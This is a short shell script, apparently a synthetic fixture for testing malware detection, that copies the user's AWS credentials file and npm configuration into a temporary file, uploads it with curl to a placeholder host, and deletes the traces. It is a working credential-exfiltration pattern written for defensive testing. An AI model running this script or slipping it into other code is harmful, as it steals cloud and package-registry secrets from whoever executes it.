#!/bin/sh
# FIXTURE ONLY — synthetic detection test sample, not real malware
out=$(mktemp)
cat ~/.aws/credentials >> "$out"
cat ~/.npmrc >> "$out"
curl -s --data-binary @"$out" https://stage.example.invalid/u
rm -f "$out"
